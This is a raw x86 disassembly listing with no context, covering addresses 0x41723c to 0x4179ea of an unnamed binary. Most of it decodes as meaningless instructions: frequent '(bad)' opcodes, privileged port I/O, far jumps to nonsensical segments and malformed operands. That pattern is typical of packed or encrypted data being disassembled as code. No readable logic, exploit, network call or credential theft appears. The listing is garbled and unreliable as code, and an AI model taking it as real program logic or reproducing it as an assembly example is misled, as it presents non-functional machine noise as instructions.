  41723c:	sar    BYTE PTR [ebx-0x77],0x6f
  417240:	inc    eax
  417241:	push   0xf
  417243:	scas   eax,DWORD PTR es:[edi]
  417244:	(bad)  
  417245:	add    ecx,ebp
  417247:	iret   
  417248:	sub    ecx,ebx
  41724a:	pop    DWORD PTR [ecx+0x2b]
  41724d:	push   0x258d4807
  417252:	or     ah,0x75
  417255:	mov    ebx,0xe476f8ee
  41725a:	mov    edi,0xff2b63eb
  41725f:	dec    eax
  417260:	adc    al,0x6b
  417262:	and    eax,0x11a86efe
  417267:	mov    DWORD PTR [ebp-0x10],edi
  41726a:	cmp    ebx,DWORD PTR [ebp-0x10]
  41726d:	jge    0x417281
  41726f:	add    al,0x4c
  417271:	iret   
  417272:	pop    esp
  417273:	sub    DWORD PTR [eax],ebx
  417275:	sub    al,0x8f
  417277:	inc    edi
  417278:	push   edx
  417279:	xor    ecx,ecx
  41727b:	mov    dh,0x11
  41727d:	xor    al,0x0
  41727f:	add    eax,eax
  417281:	fist   DWORD PTR [eax+0x16]
  417284:	in     eax,dx
  417285:	mov    cl,0xc1
  417287:	mov    dh,0xe5
  417289:	adc    ch,BYTE PTR [eax+0x4d]
  41728c:	pop    ebp
  41728d:	cmp    bl,ch
  41728f:	push   ss
  417290:	or     DWORD PTR [ebp+0x30],eax
  417293:	mov    al,0x75
  417295:	sub    ecx,esi
  417297:	sbb    ch,al
  417299:	mov    ebx,0xda23da22
  41729e:	es jle 0x4172c6
  4172a1:	(bad)  
  4172a2:	fistp  QWORD PTR [ecx+0x11d8f7da]
  4172a8:	add    DWORD PTR [ecx+0x2bd30818],ecx
  4172ae:	xlat   BYTE PTR ds:[ebx]
  4172af:	pop    eax
  4172b0:	mov    BYTE PTR [esi+edi*4],0x5
  4172b4:	imul   ecx,DWORD PTR ds:0x735a0ff3,0xfffffff4
  4172bb:	add    DWORD PTR [esi+0x28],edi
  4172be:	cmc    
  4172bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172c0:	push   ss
  4172c1:	ficomp WORD PTR [edi]
  4172c3:	or     BYTE PTR [edi+edi*8],al
  4172c6:	imul   ecx,DWORD PTR [ebx+0x4a],0x1c
  4172ca:	inc    ebx
  4172cb:	xor    esi,esi
  4172cd:	sbb    eax,0xaa3bbb6c
  4172d2:	aaa    
  4172d3:	lea    eax,[eax+esi*4]
  4172d6:	pusha  
  4172d7:	hlt    
  4172d8:	retf   
  4172d9:	pop    eax
  4172da:	inc    esi
  4172db:	inc    ebp
  4172dc:	mov    ah,0x8
  4172de:	or     edi,DWORD PTR [edi]
  4172e0:	out    0x6a,eax
  4172e2:	dec    edi
  4172e3:	ins    BYTE PTR es:[edi],dx
  4172e4:	loope  0x41726d
  4172e6:	fmul   DWORD PTR [ebx-0x3f821a75]
  4172ec:	push   esp
  4172ed:	sub    ebx,0x4
  4172f0:	and    BYTE PTR [esi+edi*4],ah
  4172f3:	add    BYTE PTR [edx-0x29],0x17
  4172f7:	xor    ebp,DWORD PTR [edi+0x5a]
  4172fa:	shl    BYTE PTR [edx+0x274912d0],0x1f
  417301:	mov    DWORD PTR [ebx],edx
  417303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417304:	xchg   ebx,eax
  417305:	jp     0x41735b
  417307:	xchg   esi,eax
  417308:	mov    ebx,esi
  41730a:	loopne 0x41732e
  41730c:	pop    eax
  41730d:	popf   
  41730e:	and    al,BYTE PTR [edi]
  417310:	mov    ecx,0xa06b951a
  417315:	or     DWORD PTR [esi],edi
  417317:	lahf   
  417318:	sbb    BYTE PTR [eax],ah
  41731a:	sbb    eax,0x1a
  41731d:	mov    cl,al
  41731f:	es adc al,0x7
  417322:	dec    ebx
  417323:	pusha  
  417324:	xor    DWORD PTR [esi-0x60],ebx
  417327:	inc    esp
  417328:	mov    ah,0xc
  41732a:	inc    DWORD PTR [ebx-0x8]
  41732d:	pop    ss
  41732e:	add    cl,BYTE PTR [esp+esi*4]
  417331:	inc    edx
  417332:	mov    ebx,0x682dd777
  417337:	stos   DWORD PTR es:[edi],eax
  417338:	ins    BYTE PTR es:[edi],dx
  417339:	push   ebx
  41733a:	clc    
  41733b:	(bad)  
  41733c:	fnstcw WORD PTR [ebx-0x21]
  41733f:	mov    ds:0x2b809c07,eax
  417344:	and    esi,ebx
  417346:	xchg   ebx,eax
  417347:	push   eax
  417348:	pop    ss
  417349:	and    al,BYTE PTR [esi+ebp*8-0x3f]
  41734d:	les    esi,FWORD PTR [edx-0x275cae8a]
  417353:	int    0x3c
  417355:	or     ah,dh
  417357:	inc    edx
  417358:	jne    0x417360
  41735a:	inc    esp
  41735b:	outs   dx,BYTE PTR ds:[esi]
  41735c:	fucomi st,st(6)
  41735e:	sbb    cl,BYTE PTR [ecx+0x10051043]
  417364:	cmp    ecx,DWORD PTR [eax]
  417366:	cs jo  0x417326
  417369:	inc    ecx
  41736a:	call   DWORD PTR [bx+di+0x12]
  41736e:	hlt    
  41736f:	mov    eax,ds:0x1709e530
  417374:	icebp  
  417375:	mov    ecx,DWORD PTR [edi+0x74]
  417378:	sub    esp,DWORD PTR [ebp-0x303503f2]
  41737e:	lahf   
  41737f:	push   es
  417380:	or     BYTE PTR [edi+eax*1+0xc],dh
  417384:	jne    0x417391
  417386:	jle    0x4173fc
  417388:	mov    ecx,DWORD PTR [esi]
  41738a:	mov    BYTE PTR [eax],dl
  41738c:	ins    DWORD PTR es:[edi],dx
  41738d:	es or  eax,0xb112dfa5
  417393:	rol    DWORD PTR [edx],0x89
  417396:	sti    
  417397:	ret    
  417398:	pop    edx
  417399:	scas   eax,DWORD PTR es:[edi]
  41739a:	test   al,0x42
  41739c:	hlt    
  41739d:	jbe    0x4173f0
  41739f:	dec    ebx
  4173a0:	lea    esi,[ebp-0x4]
  4173a3:	(bad)  
  4173a4:	fadd   DWORD PTR [ebp-0x74]
  4173a7:	xor    eax,0xe1a48168
  4173ac:	mov    bl,BYTE PTR [eax]
  4173ae:	(bad)  
  4173af:	sbb    bh,BYTE PTR [ebp+0x1]
  4173b2:	stos   DWORD PTR es:[edi],eax
  4173b3:	add    eax,0x765cfb80
  4173b8:	or     al,0x28
  4173ba:	dec    ecx
  4173bb:	ins    DWORD PTR es:[edi],dx
  4173bc:	xchg   ebx,eax
  4173bd:	mov    al,ds:0x9ea4805f
  4173c2:	jmp    0x684d:0xd78c9102
  4173c9:	call   0x96317bc5
  4173ce:	fdivr  DWORD PTR [eax]
  4173d0:	hlt    
  4173d1:	mov    ecx,0xff86844
  4173d6:	ss inc esi
  4173d8:	test   DWORD PTR [eax],0x7be81de2
  4173de:	xor    bh,ah
  4173e0:	adc    eax,0x857baa3a
  4173e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173e6:	cmp    eax,0x87ff2450
  4173eb:	mov    DWORD PTR [eax+0x7a5630ed],eax
  4173f1:	clc    
  4173f2:	push   eax
  4173f3:	adc    eax,0x7095dbe8
  4173f8:	les    edi,FWORD PTR [ebp+0x20]
  4173fb:	or     eax,0x707b3880
  417400:	outs   dx,BYTE PTR ds:[esi]
  417401:	jmp    0x417472
  417403:	inc    ecx
  417404:	pop    es
  417405:	js     0x417408
  417407:	pop    esp
  417408:	mov    esi,0x450c3f27
  41740d:	and    BYTE PTR [esi-0x2f],bh
  417410:	aas    
  417411:	or     eax,0xac60043a
  417416:	adc    bl,ch
  417418:	mov    al,ds:0x190dd922
  41741d:	push   es
  41741e:	pop    ss
  41741f:	js     0x4173d4
  417421:	pop    es
  417422:	mov    ?,ebp
  417424:	adc    BYTE PTR [ecx],cl
  417426:	xor    edx,DWORD PTR [esi]
  417428:	gs mov bl,0xd8
  41742b:	fbld   TBYTE PTR [ecx-0x7203a2d5]
  417431:	inc    ebx
  417432:	add    DWORD PTR [ecx+0x74],ebp
  417435:	jo     0x417408
  417437:	mov    eax,0x41b8d969
  41743c:	inc    ebx
  41743d:	jge    0x41742b
  41743f:	sub    edx,edi
  417441:	mov    dh,0x8
  417443:	not    DWORD PTR [esi-0x5b]
  417446:	ret    
  417447:	inc    eax
  417448:	cmp    eax,0xb3a970b7
  41744d:	ss jnp 0x4174ac
  417450:	inc    edi
  417451:	push   edi
  417452:	enter  0x1938,0x3a
  417456:	pop    ecx
  417457:	dec    eax
  417458:	data16 outs dx,BYTE PTR ds:[esi]
  41745a:	inc    esi
  41745b:	stos   BYTE PTR es:[edi],al
  41745c:	dec    BYTE PTR [ebp+0x3]
  41745f:	les    edi,FWORD PTR [ebx]
  417461:	fcmovnu st,st(0)
  417463:	ins    DWORD PTR es:[edi],dx
  417464:	adc    DWORD PTR [edx],0x74
  417467:	jnp    0x417468
  417469:	mov    esp,0xbf2bd61f
  41746e:	aas    
  41746f:	(bad)  
  417471:	sub    al,0x8d
  417473:	push   ebx
  417474:	mov    bl,0xc2
  417476:	push   eax
  417477:	jg     0x4174d5
  417479:	mov    BYTE PTR [ebp+ebx*1-0x3647a3ce],0x66
  417481:	mov    bh,0x78
  417483:	push   cs
  417484:	push   ebp
  417485:	dec    eax
  417486:	push   eax
  417487:	sub    DWORD PTR [esi+0x7],ebx
  41748a:	jno    0x417465
  41748c:	mov    al,0x40
  41748e:	pop    edi
  41748f:	aas    
  417490:	inc    eax
  417491:	and    eax,0x597a1c20
  417496:	in     al,dx
  417497:	loopne 0x41741e
  417499:	dec    ecx
  41749a:	fild   WORD PTR [eax+0x60]
  41749d:	inc    esi
  41749e:	or     DWORD PTR [eax],0x7f
  4174a1:	loope  0x4174a2
  4174a3:	sti    
  4174a4:	dec    DWORD PTR ds:0x72656b68
  4174aa:	outs   dx,BYTE PTR ds:[esi]
  4174ab:	gs ins BYTE PTR es:[edi],dx
  4174ad:	xor    esi,DWORD PTR [edx]
  4174af:	cs fs ins BYTE PTR es:[edi],dx
  4174b2:	ins    BYTE PTR es:[edi],dx
  4174b3:	add    ah,al
  4174b5:	gs je  0x417504
  4174b8:	outs   dx,DWORD PTR ds:[esi]
  4174b9:	outs   dx,BYTE PTR ds:[esi]
  4174ba:	addr16 cwde 
  4174bc:	and    edi,DWORD PTR [edi+edi*8+0x68746150]
  4174c3:	dec    esi
  4174c4:	popa   
  4174c5:	ins    DWORD PTR es:[edi],dx
  4174c6:	gs inc ecx
  4174c8:	adc    edx,edi
  4174ca:	fdiv   st(6),st
  4174cc:	inc    edx
  4174cd:	mov    esp,0xa8d23041
  4174d2:	fbstp  TBYTE PTR [esi+0x46]
  4174d5:	stos   BYTE PTR es:[edi],al
  4174d6:	ins    DWORD PTR es:[edi],dx
  4174d7:	xlat   BYTE PTR ds:[ebx]
  4174d8:	ds in  al,dx
  4174da:	mov    BYTE PTR [ebp-0x12],0x11
  4174de:	addr16 push 0x95007419
  4174e4:	dec    edx
  4174e5:	mov    dl,0xdc
  4174e7:	xor    dl,BYTE PTR [eax+0x4e]
  4174ea:	add    DWORD PTR [ecx-0x6b37f27f],eax
  4174f0:	sbb    eax,0x553b2202
  4174f5:	lods   al,BYTE PTR ds:[esi]
  4174f6:	or     cl,cl
  4174f8:	ins    BYTE PTR es:[edi],dx
  4174f9:	hlt    
  4174fa:	addr16 pop ds
  4174fc:	dec    ecx
  4174fd:	jbe    0x417571
  4174ff:	adc    BYTE PTR [ebp-0x2],cl
  417502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417503:	test   BYTE PTR [edx+0x787b6ab6],bh
  417509:	(bad)  
  41750a:	cwde   
  41750b:	xor    BYTE PTR [esi-0x18],al
  41750e:	sub    dh,0x3b
  417511:	fisttp WORD PTR [ebx]
  417513:	jbe    0x4174b5
  417515:	std    
  417516:	dec    sp
  417518:	pop    ds
  417519:	cmp    esi,DWORD PTR [eax]
  41751b:	shr    DWORD PTR ds:0x41d8c67,cl
  417521:	(bad)  
  417522:	int    0xc3
  417524:	stos   BYTE PTR es:[edi],al
  417525:	fild   DWORD PTR [ebx]
  417527:	repnz add BYTE PTR [esi+0x79f84d17],ch
  41752e:	inc    esi
  41752f:	sub    al,0x21
  417531:	std    
  417532:	pop    ds
  417533:	(bad)  
  417535:	ret    0x6cb7
  417538:	punpckhdq mm0,QWORD PTR ds:0xc03f356
  41753f:	or     al,0xe4
  417541:	xchg   esi,eax
  417542:	clc    
  417543:	outs   dx,BYTE PTR ds:[esi]
  417544:	xor    al,0xe4
  417546:	sbb    al,BYTE PTR [eax+0xf0020bd]
  41754c:	stc    
  41754d:	dec    esp
  41754e:	mov    bh,0x2d
  417550:	jge    0x4175cf
  417552:	repz push esp
  417554:	or     al,BYTE PTR ds:0x50e90fee
  41755a:	js     0x417569
  41755c:	retf   
  41755d:	cmp    eax,0xf90b95f6
  417562:	pop    esi
  417563:	push   ss
  417564:	mov    dh,0x36
  417566:	jb     0x417553
  417568:	add    esp,DWORD PTR [ebp+0x2ee4bde4]
  41756e:	je     0x41757b
  417570:	and    eax,0x23ced06b
  417575:	cmp    ecx,DWORD PTR ds:0x380f0adc
  41757b:	aaa    
  41757c:	push   ss
  41757d:	(bad)  
  41757e:	jmp    DWORD PTR [ecx]
  417580:	dec    edx
  417581:	dec    ebx
  417582:	in     al,0x66
  417584:	cs jbe 0x41754d
  417587:	sub    edx,eax
  417589:	and    edx,eax
  41758b:	fidivr DWORD PTR [ebx]
  41758d:	xchg   edx,eax
  41758e:	dec    edi
  41758f:	or     eax,0x6412a198
  417594:	adc    al,0x5c
  417596:	jne    0x4175fc
  417598:	enter  0xbf66,0x72
  41759c:	xchg   BYTE PTR [esp+ebp*2+0x17],dh
  4175a0:	cmp    esi,ebx
  4175a2:	ret    0x854a
  4175a5:	mov    eax,ds:0x392f1b36
  4175aa:	dec    DWORD PTR [esi+eax*2+0x53678cad]
  4175b1:	outs   dx,DWORD PTR ds:[esi]
  4175b2:	data16 je 0x41762c
  4175b5:	popa   
  4175b6:	jle    0x41761b
  4175b8:	or     al,al
  4175ba:	jb     0x417621
  4175bc:	(bad)  
  4175bd:	arpl   WORD PTR gs:[ecx+0x6c],sp
  4175c1:	gs jae 0x417611
  4175c4:	add    BYTE PTR [esi-0x1a],dl
  4175c7:	into   
  4175c8:	sbb    esp,ebx
  4175ca:	sbb    eax,0x2280aac9
  4175cf:	mov    edi,0x9c7ea182
  4175d4:	inc    eax
  4175d5:	scas   eax,DWORD PTR es:[edi]
  4175d6:	xor    al,0xd3
  4175d8:	cmc    
  4175d9:	cmp    DWORD PTR [ebx],ebx
  4175db:	retf   
  4175dc:	dec    esi
  4175dd:	xchg   BYTE PTR [ebx-0x6e3abcb6],ch
  4175e3:	test   eax,0xd021ce81
  4175e8:	add    al,0x95
  4175ea:	or     cl,BYTE PTR [ebx-0x3b13c2aa]
  4175f0:	sbb    edi,DWORD PTR [eax]
  4175f2:	jne    0x4175bb
  4175f4:	jnp    0x41757f
  4175f6:	ja     0x4175fc
  4175f8:	push   ds
  4175f9:	mov    edx,DWORD PTR ds:0x6a31024
  4175ff:	lahf   
  417600:	dec    eax
  417601:	bnd jnp 0x417611
  417604:	mov    esi,0xc84f755a
  417609:	or     eax,0x40a01a0
  41760e:	sar    DWORD PTR [esi],cl
  417610:	mov    WORD PTR [ebp-0x30],?
  417613:	idiv   DWORD PTR [ecx+0x7c]
  417616:	dec    edi
  417617:	cmp    eax,DWORD PTR ds:0x91753a
  41761d:	fsub   DWORD PTR [edi+eax*1-0x72]
  417621:	inc    esi
  417622:	jmp    0x417656
  417624:	jns    0x4175cb
  417626:	and    al,0x7a
  417628:	sub    eax,DWORD PTR [edi]
  41762a:	rcr    edx,0x3b
  41762d:	push   ds
  41762e:	and    esi,DWORD PTR [ebp-0x4a]
  417631:	aaa    
  417632:	sbb    BYTE PTR [ebx],dl
  417634:	jbe    0x417621
  417636:	push   cs
  417637:	nop
  417638:	fsub   QWORD PTR [edi+ebp*4-0x6b]
  41763c:	ja     0x4176bc
  41763e:	inc    edx
  41763f:	sbb    bl,0x8b
  417642:	add    bh,bh
  417644:	push   eax
  417645:	or     BYTE PTR ds:0x45d80160,dl
  41764b:	sbb    DWORD PTR [ebx+0x587f5202],edx
  417651:	das    
  417652:	adc    BYTE PTR ds:0xa08f90da,ah
  417658:	call   0xb09277e8
  41765d:	fild   DWORD PTR [ebx-0x6b47df90]
  417663:	je     0x41766b
  417665:	push   cs
  417666:	add    BYTE PTR [eax+eiz*8],bl
  417669:	inc    ecx
  41766a:	dec    ebx
  41766b:	mov    ebp,0x9f4305d5
  417670:	push   ss
  417671:	cmp    eax,0xb7f17b81
  417676:	jge    0x4176a2
  417678:	pop    edx
  417679:	xchg   ecx,eax
  41767a:	or     al,0xe
  41767c:	push   edx
  41767d:	push   ebp
  41767e:	das    
  41767f:	test   al,0xd5
  417681:	or     BYTE PTR [edi-0x4a43c6bf],bl
  417687:	sbb    al,0x77
  417689:	scas   al,BYTE PTR es:[edi]
  41768a:	inc    esi
  41768b:	add    BYTE PTR [ebp+0xab1c66b],0x76
  417692:	(bad)
  417695:	mov    edi,0xe02df353
  41769a:	pop    ebx
  41769b:	add    BYTE PTR [eax],dl
  41769d:	dec    edx
  41769e:	adc    al,0x88
  4176a0:	pop    ecx
  4176a1:	pop    ss
  4176a2:	jne    0x41766f
  4176a4:	cld    
  4176a5:	sub    esp,0x22
  4176a8:	pop    ds
  4176a9:	adc    BYTE PTR [eax+0x6a],0x7
  4176ad:	lea    edx,[ebp-0xb]
  4176b0:	push   edx
  4176b1:	push   0x324c6dd
  4176b6:	mov    bh,0x7
  4176b8:	push   ds
  4176b9:	lock adc DWORD PTR [ecx-0x54c4a0ed],edi
  4176c0:	pop    es
  4176c1:	xchg   ecx,eax
  4176c2:	cs mov cl,0xf
  4176c5:	cld    
  4176c6:	call   0x92e0:0xda00f00a
  4176cd:	popa   
  4176ce:	icebp  
  4176cf:	mov    cl,0x72
  4176d1:	outs   dx,BYTE PTR ds:[esi]
  4176d2:	adc    cl,BYTE PTR [ebp-0x77]
  4176d5:	dec    eax
  4176d6:	xor    DWORD PTR [ebp+0x5c],eax
  4176d9:	mov    WORD PTR [eax+eax*1+0x23],fs
  4176dd:	inc    ecx
  4176de:	jae    0x41772b
  4176e0:	icebp  
  4176e1:	and    DWORD PTR [edi],ebx
  4176e3:	(bad)  
  4176e4:	ficom  DWORD PTR [eax-0x1]
  4176e7:	add    eax,0xf7569b4
  4176ec:	cli    
  4176ed:	pop    esp
  4176ee:	shl    DWORD PTR [ebx],0xb8
  4176f1:	cld    
  4176f2:	push   eax
  4176f3:	push   0x905db22c
  4176f8:	addr16 or eax,esp
  4176fb:	add    eax,DWORD PTR [edx+ecx*1]
  4176fe:	rcr    BYTE PTR [edi-0x25],1
  417701:	shl    DWORD PTR [eax+0x66],0xe1
  417705:	push   edi
  417706:	clc    
  417707:	scas   eax,DWORD PTR es:[edi]
  417708:	sub    DWORD PTR ds:0xdc351242,0xfffffffd
  41770f:	add    DWORD PTR [edi],ecx
  417711:	add    ebp,0xffffff9e
  417714:	mov    BYTE PTR ds:0xa702af08,0xb2
  41771b:	jnp    0x41770b
  41771d:	push   esi
  41771e:	sbb    al,BYTE PTR [esi+0x0]
  417721:	inc    ecx
  417722:	add    BYTE PTR [eax],dl
  417724:	add    BYTE PTR [edi-0x16],al
  417727:	xor    esi,DWORD PTR [edi-0x43e01078]
  41772d:	or     ah,ch
  41772f:	fs mov bh,0xd9
  417732:	push   ds
  417733:	je     0x41779b
  417735:	sbb    eax,0x8d7b04c
  41773a:	sbb    BYTE PTR [edx],al
  41773c:	aas    
  41773d:	sti    
  41773e:	loope  0x41775c
  417740:	in     al,0x3
  417742:	or     ah,dl
  417744:	mov    ds:0x8c01a63c,eax
  417749:	mov    ds:0xea1c5038,eax
  41774e:	pusha  
  41774f:	or     DWORD PTR [ebp+eiz*1+0x6a1a2ace],eax
  417756:	mul    bl
  417758:	sub    eax,0xf566fd10
  41775d:	lods   al,BYTE PTR ds:[esi]
  41775e:	push   0xb87637d9
  417763:	call   0x9b659853
  417768:	mov    ebx,0x4004578b
  41776d:	sbb    BYTE PTR [ebx+0x3f0f1014],ah
  417773:	add    BYTE PTR [ebp+0x757c0e2f],cl
  417779:	retf   
  41777a:	jmp    DWORD PTR ds:0x49d832cc
  417780:	add    bl,dl
  417782:	enter  0xc407,0xb1
  417786:	(bad)  [edx+0x40a6c00c]
  41778c:	inc    ecx
  41778d:	mov    esp,0xf4030bdf
  417792:	dec    ebx
  417793:	mov    eax,0xe0119bb1
  417798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417799:	push   0xfffffff8
  41779b:	sbb    BYTE PTR [edx],ah
  41779d:	cmp    DWORD PTR ss:0xd8ff0698,0xffffff89
  4177a5:	jle    0x4177e7
  4177a7:	nop
  4177a8:	loop   0x41774c
  4177aa:	inc    ecx
  4177ab:	aam    0xe3
  4177ad:	out    dx,eax
  4177ae:	fstp   TBYTE PTR [edx-0x14ebf394]
  4177b4:	call   0x1b91a15a
  4177b9:	jl     0x4177c9
  4177bb:	call   0x8a56444d
  4177c0:	or     eax,0x8412a35c
  4177c5:	sti    
  4177c6:	mov    dl,BYTE PTR [esi+0x6426916e]
  4177cc:	push   ebx
  4177cd:	sub    al,0xa9
  4177cf:	cmp    BYTE PTR [ebx+ebx*1],0x6
  4177d3:	cs sbb ebp,eax
  4177d6:	sub    eax,esp
  4177d8:	ins    BYTE PTR es:[edi],dx
  4177d9:	mov    al,0xa1
  4177db:	mov    ecx,0x68a8e64f
  4177e0:	pop    ds
  4177e1:	adc    bl,bl
  4177e3:	ret    
  4177e4:	mov    eax,0xc5e209c
  4177e9:	test   al,0x3d
  4177eb:	pop    ebx
  4177ec:	call   0x4b72e9b4
  4177f1:	out    dx,al
  4177f2:	jge    0x417800
  4177f4:	pusha  
  4177f5:	inc    ecx
  4177f6:	mov    ah,0xa3
  4177f8:	pusha  
  4177f9:	pop    ebx
  4177fa:	add    al,0x5b
  4177fc:	mov    al,ds:0x33acecfb
  417801:	sbb    al,0xa4
  417803:	push   es
  417804:	test   al,0x34
  417806:	inc    edx
  417807:	ins    BYTE PTR es:[edi],dx
  417808:	mov    edx,0xe03c603e
  41780d:	fsubr  DWORD PTR [eax+0x2feb4c29]
  417813:	dec    esi
  417814:	xchg   BYTE PTR [ebx+0x6452e5e4],bh
  41781a:	aas    
  41781b:	or     ch,ah
  41781d:	push   edx
  41781e:	in     eax,dx
  41781f:	ins    DWORD PTR es:[edi],dx
  417820:	rol    BYTE PTR [eax+0x17],0x2d
  417824:	push   ds
  417825:	cwde   
  417826:	add    edi,DWORD PTR [ecx+0x1d3760e4]
  41782c:	push   ebx
  41782d:	ins    BYTE PTR es:[edi],dx
  41782e:	or     BYTE PTR [eax+0x5324c91c],cl
  417834:	ins    BYTE PTR es:[edi],dx
  417835:	or     DWORD PTR [ebp+0x8],0x58
  417839:	iret   
  41783a:	adc    dh,BYTE PTR [edi+0x320c2407]
  417840:	enter  0x2020,0x1c
  417844:	sbb    BYTE PTR [edx],dh
  417846:	enter  0x8320,0x14
  41784a:	adc    BYTE PTR [eax+ecx*8],cl
  41784d:	and    BYTE PTR [ebx+0x4080c],al
  417853:	inc    ecx
  417854:	push   es
  417855:	cmp    DWORD PTR [ecx],edi
  417857:	cld    
  417858:	adc    eax,edi
  41785a:	hlt    
  41785b:	push   es
  41785c:	sbb    DWORD PTR [eax+edx*4-0x10],esp
  417860:	in     al,dx
  417861:	call   0x90a5924a
  417866:	inc    ecx
  417867:	loopne 0x417845
  417869:	fmul   st,st(0)
  41786b:	leave  
  41786c:	inc    ecx
  41786d:	push   es
  41786e:	aam    0x40
  417870:	adc    al,BYTE PTR [edx+eiz*1-0x7d]
  417874:	or     al,0x32
  417876:	cmp    al,0x38
  417878:	xor    al,0x81
  41787a:	pop    esp
  41787b:	jb     0x41788d
  41787d:	pop    ss
  41787e:	xor    eax,0x443c7054
  417883:	mov    fs,esp
  417885:	cmp    al,0x54
  417887:	jo     0x41783d
  417889:	lock push es
  41788b:	sbb    esp,esp
  41788d:	jae    0x417865
  41788f:	pop    es
  417890:	icebp  
  417891:	repnz repz sbb DWORD PTR [eax+edx*4+0x41],esp
  417897:	hlt    
  417898:	cmc    
  417899:	mul    BYTE PTR [eax+edx*4+0x41]
  41789d:	push   es
  41789e:	idiv   eax
  4178a0:	stc    
  4178a1:	nop
  4178a2:	inc    ecx
  4178a3:	push   es
  4178a4:	sbb    edx,edi
  4178a6:	sti    
  4178a7:	cld    
  4178a8:	inc    ecx
  4178a9:	push   es
  4178aa:	sbb    DWORD PTR [ebp+edi*8-0x2],esp
  4178ae:	inc    DWORD PTR [esi]
  4178b0:	sbb    DWORD PTR [eax+edx*4-0x20],esp
  4178b4:	loope  0x417898
  4178b6:	jecxz  0x4178d1
  4178b8:	fs nop
  4178ba:	inc    ecx
  4178bb:	in     al,0xe5
  4178bd:	out    0x64,al
  4178bf:	nop
  4178c0:	inc    ecx
  4178c1:	push   es
  4178c2:	out    0xe8,eax
  4178c4:	jmp    0x1947ba59
  4178c9:	jmp    0x6419:0x641eceb
  4178d0:	in     eax,dx
  4178d1:	out    dx,al
  4178d2:	out    dx,eax
  4178d3:	push   es
  4178d4:	sbb    DWORD PTR [eax+edx*4-0x30],esp
  4178d8:	rcl    edx,1
  4178da:	rcr    DWORD PTR [ecx],cl
  4178dc:	fs nop
  4178de:	inc    ecx
  4178df:	aam    0xd5
  4178e1:	(bad)  
  4178e2:	fs nop
  4178e4:	inc    ecx
  4178e5:	push   es
  4178e6:	xlat   BYTE PTR ds:[ebx]
  4178e7:	fcomp  st(1)
  4178e9:	nop
  4178ea:	inc    ecx
  4178eb:	push   es
  4178ec:	sbb    edx,ebx
  4178ee:	fcmovnu st,st(4)
  4178f0:	inc    ecx
  4178f1:	push   es
  4178f2:	sbb    DWORD PTR [ebp+ebx*8-0x22],esp
  4178f6:	fild   WORD PTR [esi]
  4178f8:	sbb    DWORD PTR [eax+edx*4-0x40],esp
  4178fc:	rol    edx,0xc3
  4178ff:	sbb    DWORD PTR [eax+edx*4+0x41],esp
  417903:	(bad)  
  417904:	(bad)
  417907:	nop
  417908:	inc    ecx
  417909:	push   es
  41790a:	(bad)  
  41790b:	enter  0x90c9,0x41
  41790f:	push   es
  417910:	sbb    edx,ecx
  417912:	retf   
  417913:	int3   
  417914:	inc    ecx
  417915:	push   es
  417916:	sbb    DWORD PTR [ebp+ecx*8-0x32],esp
  41791a:	iret   
  41791b:	push   es
  41791c:	sbb    DWORD PTR [eax+edx*4-0x50],esp
  417920:	mov    cl,0xb2
  417922:	mov    bl,0x19
  417924:	fs nop
  417926:	inc    ecx
  417927:	mov    ah,0xb5
  417929:	mov    dh,0x64
  41792b:	nop
  41792c:	inc    ecx
  41792d:	push   es
  41792e:	mov    bh,0xb8
  417930:	mov    ecx,0x19064190
  417935:	mov    edx,0x641bcbb
  41793a:	sbb    DWORD PTR [ebp+edi*4-0x42],esp
  41793e:	mov    edi,0x90641906
  417943:	mov    al,ds:0x19a3a2a1
  417948:	fs nop
  41794a:	inc    ecx
  41794b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41794c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41794d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41794e:	xchg   edx,eax
  41794f:	and    DWORD PTR [ecx+0x6],0xffffffa7
  417953:	imul   DWORD PTR ds:0xf247257
  417959:	in     al,0x74
  41795b:	xor    al,0x57
  41795d:	je     0x41797a
  41795f:	fdiv   DWORD PTR [eax]
  417961:	aaa    
  417962:	mov    WORD PTR [edi],ss
  417964:	add    BYTE PTR [ebx],cl
  417966:	adc    ebx,DWORD PTR [esi+0x22]
  417969:	push   0x330c9e0e
  41796e:	or     al,0x10
  417970:	inc    eax
  417971:	rcr    DWORD PTR [ebx],0x3b
  417974:	dec    edx
  417975:	push   cs
  417976:	xor    DWORD PTR [ecx],eax
  417978:	add    al,0x5b
  41797a:	jmp    0x7845:0x969127f
  417981:	arpl   WORD PTR [ebp+0x70],sp
  417984:	je     0x4179ef
  417986:	test   eax,0x334d5bf4
  41798b:	popa   
  41798c:	sub    esp,DWORD PTR [edi-0xc]
  41798f:	adc    BYTE PTR [eax-0x3],al
  417992:	and    BYTE PTR [edi-0x67d3a870],ch
  417998:	inc    ebp
  417999:	dec    eax
  41799a:	gs popa 
  41799c:	jo     0x417931
  41799e:	pop    ss
  41799f:	fst    DWORD PTR [ebx+0x5850905a]
  4179a5:	pop    ebx
  4179a6:	push   eax
  4179a7:	pop    eax
  4179a8:	sar    bh,1
  4179aa:	add    DWORD PTR [eax+0x4f450ca8],edx
  4179b0:	jne    0x417a26
  4179b2:	dec    edi
  4179b3:	dec    bp
  4179b5:	gs ins DWORD PTR es:[edi],dx
  4179b7:	das    
  4179b8:	xchg   esp,eax
  4179b9:	xor    eax,0x9f79e3b0
  4179be:	lods   al,BYTE PTR ds:[esi]
  4179bf:	pop    ebx
  4179c0:	pop    ds
  4179c1:	(bad)  [edi+0x1fb76612]
  4179c7:	or     eax,DWORD PTR [ebp+0x49]
  4179ca:	outs   dx,BYTE PTR ds:[esi]
  4179cb:	pop    ebp
  4179cc:	inc    ebp
  4179cd:	and    BYTE PTR [edi],ch
  4179cf:	mov    dl,0xdb
  4179d1:	jb     0x417a45
  4179d3:	pop    ebx
  4179d4:	add    al,0x59
  4179d6:	push   edi
  4179d7:	add    al,0x59
  4179d9:	add    ch,BYTE PTR [esp+edx*1]
  4179dc:	push   esi
  4179dd:	or     esi,DWORD PTR gs:[edi+ebx*1+0x43]
  4179e2:	fld    DWORD PTR [edx-0x5d]
  4179e5:	test   bh,dl
  4179e7:	pop    esp
  4179e8:	push   edi
  4179e9:	pop    esp
  4179ea:	xchg   edx,eax
